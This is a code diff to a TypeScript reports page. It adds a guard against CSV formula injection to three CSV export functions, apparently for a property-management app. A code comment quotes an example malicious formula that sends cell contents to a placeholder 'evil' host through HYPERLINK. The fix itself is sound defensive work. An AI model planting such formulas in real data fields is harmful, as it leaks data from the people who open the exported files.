@@ -12,6 +12,26 @@ import { SPECIALIZATION_LABELS } from '../../types';
 import { useLanguageStore } from '../../stores/languageStore';
 import { apiRequest } from '../../services/api/client';
 
+// Sprint 72 P1/F4: CSV formula-injection guard. A resident name like
+// `=HYPERLINK("http://evil/?x="&A1,"click")` opens as a live formula
+// when the admin opens the CSV in Excel/LibreOffice. Prefix any cell
+// whose first character is =, +, -, @, tab, or CR with a single quote
+// so the spreadsheet treats it as text, then CSV-quote the result.
+function csvCell(value: unknown): string {
+  let s = value === null || value === undefined ? '' : String(value);
+  if (s.length > 0 && /^[=+\-@\t\r]/.test(s)) {
+    s = "'" + s;
+  }
+  // Quote when value contains separator, quote, newline, or carriage return.
+  if (/[;"\n\r]/.test(s)) {
+    s = '"' + s.replace(/"/g, '""') + '"';
+  }
+  return s;
+}
+function csvRow(row: unknown[]): string {
+  return row.map(csvCell).join(';');
+}
+
 export function ReportsPage() {
   const requests = useRequestStore(s => s.requests);
   const executors = useExecutorStore(s => s.executors);
@@ -117,7 +137,7 @@ export function ReportsPage() {
       r.last_payment_date ? new Date(r.last_payment_date).toLocaleDateString('ru-RU') : '-',
       statusLabel(r.account_status || 'active'),
     ]);
-    const csvContent = [headers, ...rows].map(row => row.join(';')).join('\n');
+    const csvContent = [headers, ...rows].map(csvRow).join('\n');
     const blob = new Blob(['\uFEFF' + csvContent], { type: 'text/csv;charset=utf-8;' });
     const url = window.URL.createObjectURL(blob);
     const link = document.createElement('a');
@@ -262,7 +282,7 @@ export function ReportsPage() {
       s.categoryBreakdown.intercom || 0,
     ]);
 
-    const csvContent = [headers, ...rows].map(row => row.join(';')).join('\n');
+    const csvContent = [headers, ...rows].map(csvRow).join('\n');
     const BOM = '\uFEFF';
     const blob = new Blob([BOM + csvContent], { type: 'text/csv;charset=utf-8;' });
     const url = window.URL.createObjectURL(blob);
@@ -310,7 +330,7 @@ export function ReportsPage() {
       r.rating || '-'
     ]);
 
-    const csvContent = [headers, ...rows].map(row => row.join(';')).join('\n');
+    const csvContent = [headers, ...rows].map(csvRow).join('\n');
     const BOM = '\uFEFF'; // For proper Cyrillic encoding in Excel
     const blob = new Blob([BOM + csvContent], { type: 'text/csv;charset=utf-8;' });
     const url = window.URL.createObjectURL(blob);
